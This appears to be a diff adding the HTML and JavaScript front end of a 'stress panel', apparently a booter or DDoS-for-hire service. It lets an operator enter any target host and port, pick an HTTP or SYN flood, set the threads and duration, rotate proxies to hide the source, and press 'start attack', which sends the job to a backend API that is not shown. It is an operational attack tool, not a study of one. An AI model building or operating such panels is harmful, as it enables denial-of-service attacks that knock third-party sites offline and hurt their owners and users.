@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>stress panel</title>
+<style>
+  :root {
+    --bg: #0a0a0a;
+    --panel: #111;
+    --border: #222;
+    --fg: #e0e0e0;
+    --dim: #666;
+    --accent: #ff3c3c;
+    --ok: #3cff7a;
+    --warn: #ffcc3c;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: 'Courier New', monospace;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 1rem;
+  }
+  .panel {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    padding: 2rem;
+    width: 100%;
+    max-width: 580px;
+    border-radius: 6px;
+  }
+  h1 {
+    font-size: 1.1rem;
+    color: var(--accent);
+    margin-bottom: 1.5rem;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .stats {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: .25rem .75rem;
+    font-size: .65rem;
+    color: var(--dim);
+    letter-spacing: normal;
+    text-transform: none;
+  }
+  .stats b { color: var(--ok); }
+  label {
+    display: block;
+    margin-bottom: .25rem;
+    font-size: .7rem;
+    color: var(--dim);
+    text-transform: uppercase;
+  }
+  input, select {
+    width: 100%;
+    padding: .55rem;
+    margin-bottom: 1rem;
+    background: #000;
+    border: 1px solid #333;
+    color: var(--fg);
+    font-family: inherit;
+    font-size: .85rem;
+  }
+  input:focus, select:focus {
+    outline: none;
+    border-color: var(--accent);
+  }
+  .row {
+    display: flex;
+    gap: 1rem;
+  }
+  .row > div { flex: 1; }
+  .checkbox-row {
+    display: flex;
+    align-items: center;
+    gap: .5rem;
+    margin-bottom: 1rem;
+  }
+  .checkbox-row input { width: auto; margin: 0; }
+  .checkbox-row label {
+    margin: 0;
+    text-transform: none;
+    color: var(--fg);
+    font-size: .8rem;
+  }
+  button {
+    width: 100%;
+    padding: .75rem;
+    background: var(--accent);
+    color: #000;
+    border: none;
+    font-weight: bold;
+    cursor: pointer;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    font-family: inherit;
+    font-size: .85rem;
+  }
+  button:hover { background: #ff5c5c; }
+  button:disabled {
+    background: #333;
+    color: #666;
+    cursor: not-allowed;
+  }
+  #log {
+    background: #000;
+    border: 1px solid var(--border);
+    padding: 1rem;
+    margin-top: 1.5rem;
+    height: 180px;
+    overflow-y: auto;
+    font-size: .7rem;
+    color: var(--ok);
+  }
+  #log p { margin: .2rem 0; word-break: break-word; }
+  #log p.err { color: var(--accent); }
+  #log p.warn { color: var(--warn); }
+</style>
+</head>
+<body>
+<div class="panel">
+  <h1>
+    stress panel
+    <div class="stats">
+      <span>proxies: <b id="proxyCount">-</b></span>
+      <span>running: <b id="runningCount">-</b></span>
+    </div>
+  </h1>
+
+  <label>admin key</label>
+  <input type="password" id="adminKey" placeholder="enter key">
+
+  <label>target</label>
+  <input type="text" id="target" placeholder="example.com or 1.2.3.4">
+
+  <div class="row">
+    <div>
+      <label>port</label>
+      <input type="number" id="port" value="80">
+    </div>
+    <div>
+      <label>method</label>
+      <select id="method">
+        <option value="http">http flood</option>
+        <option value="syn">syn flood</option>
+      </select>
+    </div>
+  </div>
+
+  <div class="row">
+    <div>
+      <label>threads</label>
+      <input type="number" id="threads" value="100">
+    </div>
+    <div>
+      <label>duration (s)</label>
+      <input type="number" id="duration" value="30">
+    </div>
+  </div>
+
+  <div class="checkbox-row">
+    <input type="checkbox" id="useProxy" checked>
+    <label for="useProxy">use proxies (rotate per request)</label>
+  </div>
+
+  <button id="start">start attack</button>
+  <div id="log"></div>
+</div>
+
+<script>
+  const API_BASE = '';
+
+  const logEl = document.getElementById('log');
+  const startBtn = document.getElementById('start');
+  const proxyCountEl = document.getElementById('proxyCount');
+  const runningCountEl = document.getElementById('runningCount');
+  let active = false;
+
+  function log(msg, cls) {
+    const p = document.createElement('p');
+    if (cls) p.className = cls;
+    p.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    logEl.appendChild(p);
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  async function refreshStats() {
+    try {
+      const [pRes, sRes] = await Promise.all([
+        fetch(`${API_BASE}/api/proxies/count`),
+        fetch(`${API_BASE}/api/status`),
+      ]);
+      if (pRes.ok) {
+        const p = await pRes.json();
+        proxyCountEl.textContent = p.count;
+      }
+      if (sRes.ok) {
+        const s = await sRes.json();
+        runningCountEl.textContent = s.running;
+      }
+    } catch (e) {}
+  }
+
+  setInterval(refreshStats, 5000);
+  refreshStats();
+
+  startBtn.addEventListener('click', async () => {
+    if (active) return;
+
+    const adminKey = document.getElementById('adminKey').value;
+    if (!adminKey) { log('admin key required', 'err'); return; }
+
+    const target = document.getElementById('target').value.trim();
+    if (!target) { log('target required', 'err'); return; }
+
+    const payload = {
+      target,
+      port: parseInt(document.getElementById('port').value),
+      method: document.getElementById('method').value,
+      threads: parseInt(document.getElementById('threads').value),
+      duration: parseInt(document.getElementById('duration').value),
+      useProxy: document.getElementById('useProxy').checked,
+    };
+
+    active = true;
+    startBtn.disabled = true;
+    startBtn.textContent = 'attacking...';
+
+    log(`starting ${payload.method} -> ${payload.target}:${payload.port} | ${payload.threads} threads | ${payload.duration}s`);
+
+    try {
+      const r = await fetch(`${API_BASE}/api/start`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'x-admin-key': adminKey,
+        },
+        body: JSON.stringify(payload),
+      });
+
+      if (!r.ok) {
+        const errText = await r.text();
+        throw new Error(errText || `status ${r.status}`);
+      }
+
+      const d = await r.json();
+      log(`attack #${d.id} launched | proxies available: ${d.proxies}`);
+
+      setTimeout(() => {
+        log('attack window closed');
+        active = false;
+        startBtn.disabled = false;
+        startBtn.textContent = 'start attack';
+      }, payload.duration * 1000);
+    } catch (e) {
+      log(`error: ${e.message}`, 'err');
+      active = false;
+      startBtn.disabled = false;
+      startBtn.textContent = 'start attack';
+    }
+  });
+</script>
+</body>
+</html>
